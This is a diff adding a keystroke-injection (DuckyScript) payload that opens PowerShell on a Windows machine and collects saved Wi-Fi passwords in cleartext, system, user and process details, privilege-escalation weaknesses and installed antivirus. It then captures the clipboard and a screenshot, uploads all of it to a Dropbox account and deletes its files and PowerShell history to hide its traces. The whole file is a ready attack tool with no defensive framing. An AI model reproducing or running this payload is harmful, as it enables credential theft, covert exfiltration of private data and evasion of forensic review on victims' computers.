@@ -1,0 +1,210 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+
+REM === Define paths ===
+STRING $report = "$env:TEMP\recon_report.txt"
+ENTER
+STRING $clip = "$env:TEMP\clipboard.txt"
+ENTER
+STRING $shot = "$env:TEMP\screenshot.jpg"
+ENTER
+STRING $out = ""
+ENTER
+
+REM === Wi-Fi Credentials ===
+STRING $out += "`n=== Wi-Fi Credentials ===`n"
+ENTER
+STRING $wifiList = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
+ENTER
+STRING foreach ($wifi in $wifiList) {
+ENTER
+STRING     $pass = netsh wlan show profile name="$wifi" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[1].Trim() }
+ENTER
+STRING     $out += "$wifi : $pass`n"
+ENTER
+STRING }
+ENTER
+
+REM === System Info ===
+STRING $out += "`n=== System Info ===`n"
+ENTER
+STRING $out += (Get-ComputerInfo | Out-String)
+ENTER
+
+REM === User Info ===
+STRING $out += "`n=== User Info ===`n"
+ENTER
+STRING $out += (whoami /all | Out-String)
+ENTER
+
+REM === Installed Programs ===
+STRING $out += "`n=== Installed Programs ===`n"
+ENTER
+STRING $out += (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Out-String)
+ENTER
+
+REM === Running Processes ===
+STRING $out += "`n=== Running Processes ===`n"
+ENTER
+STRING $out += (Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 | Out-String)
+ENTER
+
+REM === Open Ports ===
+STRING $out += "`n=== Open Ports ===`n"
+ENTER
+STRING $out += (netstat -ano | Select-String "LISTENING" | Out-String)
+ENTER
+
+REM === Patch Status ===
+STRING $out += "`n=== Missing Updates ===`n"
+ENTER
+STRING $out += (Get-HotFix | Out-String)
+ENTER
+
+REM === Privilege Escalation Checks ===
+STRING $out += "`n=== Privilege Escalation Checks ===`n"
+ENTER
+STRING $out += "`n[+] Admin Rights:`n"
+ENTER
+STRING $out += ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrator")
+ENTER
+STRING $out += "`n[+] UAC Settings:`n"
+ENTER
+STRING $out += (Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" | Out-String)
+ENTER
+STRING $out += "`n[+] AlwaysInstallElevated:`n"
+ENTER
+STRING $out += "HKCU: " + (Get-ItemProperty "HKCU:\Software\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated + "`n"
+ENTER
+STRING $out += "HKLM: " + (Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\Installer" -ErrorAction SilentlyContinue).AlwaysInstallElevated + "`n"
+ENTER
+STRING $out += "`n[+] Unquoted Service Paths:`n"
+ENTER
+STRING $out += (Get-WmiObject win32_service | Where { $_.PathName -match " " -and $_.PathName -notmatch '"' } | Select Name, PathName | Out-String)
+ENTER
+STRING $out += "`n[+] Writable Service Binaries:`n"
+ENTER
+STRING $out += (Get-WmiObject win32_service | ForEach {
+ENTER
+STRING $path = ($_).PathName -replace '"',''
+ENTER
+STRING if (Test-Path $path) {
+ENTER
+STRING $acl = Get-Acl $path
+ENTER
+STRING if ($acl.AccessToString -match "Everyone Allow  Write") {
+ENTER
+STRING return $_.Name + " : " + $path
+ENTER
+STRING }
+ENTER
+STRING }
+ENTER
+STRING } | Out-String)
+ENTER
+STRING $out += "`n[+] Weak Scheduled Tasks:`n"
+ENTER
+STRING $out += (schtasks /query /fo LIST /v | Select-String "Task To Run" | Out-String)
+ENTER
+STRING $out += "`n[+] Writable Registry Keys (CurrentUser):`n"
+ENTER
+STRING $out += (Get-ChildItem HKCU:\Software | ForEach {
+ENTER
+STRING try {
+ENTER
+STRING $key = $_.Name
+ENTER
+STRING $acl = Get-Acl $_.PsPath
+ENTER
+STRING if ($acl.AccessToString -match "Everyone Allow  FullControl") {
+ENTER
+STRING return $key
+ENTER
+STRING }
+ENTER
+STRING } catch {}
+ENTER
+STRING } | Out-String)
+ENTER
+STRING $out += "`n[+] WSUS Hijack:`n"
+ENTER
+STRING $out += (Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate" -ErrorAction SilentlyContinue | Out-String)
+ENTER
+STRING $out += "`n[+] AV/EDR Detection:`n"
+ENTER
+STRING $out += (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select displayName, pathToSignedProductExe | Out-String)
+ENTER
+
+REM === Write Final Report ===
+STRING $out | Out-File $report
+ENTER
+
+REM === Dump Clipboard ===
+STRING Get-Clipboard | Out-File $clip
+ENTER
+
+REM === Screenshot Capture ===
+STRING Add-Type -AssemblyName System.Windows.Forms
+ENTER
+STRING Add-Type -AssemblyName System.Drawing
+ENTER
+STRING $bmp = New-Object Drawing.Bitmap([System.Windows.Forms.SystemInformation]::VirtualScreen.Width, [System.Windows.Forms.SystemInformation]::VirtualScreen.Height)
+ENTER
+STRING $gfx = [Drawing.Graphics]::FromImage($bmp)
+ENTER
+STRING $gfx.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
+ENTER
+STRING $bmp.Save($shot, [Drawing.Imaging.ImageFormat]::Jpeg)
+ENTER
+
+REM === Upload to Dropbox ===
+STRING $token = "your_dropbox_url"
+ENTER
+
+REM Upload recon report
+STRING Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
+ENTER
+STRING -Method Post `
+ENTER
+STRING -Headers @{Authorization="Bearer $token"; "Dropbox-API-Arg"="{`"path`":`"/recon_report.txt`",`"mode`":`"overwrite`"}"; "Content-Type"="application/octet-stream"} `
+ENTER
+STRING -InFile $report
+ENTER
+
+REM Upload clipboard
+STRING Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
+ENTER
+STRING -Method Post `
+ENTER
+STRING -Headers @{Authorization="Bearer $token"; "Dropbox-API-Arg"="{`"path`":`"/clipboard.txt`",`"mode`":`"overwrite`"}"; "Content-Type"="application/octet-stream"} `
+ENTER
+STRING -InFile $clip
+ENTER
+
+REM Upload screenshot
+STRING Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" `
+ENTER
+STRING -Method Post `
+ENTER
+STRING -Headers @{Authorization="Bearer $token"; "Dropbox-API-Arg"="{`"path`":`"/screenshot.jpg`",`"mode`":`"overwrite`"}"; "Content-Type"="application/octet-stream"} `
+ENTER
+STRING -InFile $shot
+ENTER
+
+REM === Cleanup ===
+STRING Remove-Item $report, $clip, $shot -Force
+ENTER
+
+REM === Clear PowerShell History ===
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
+ENTER
+STRING Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
+ENTER
+
+REM === Done ===
+STRING exit
+ENTER
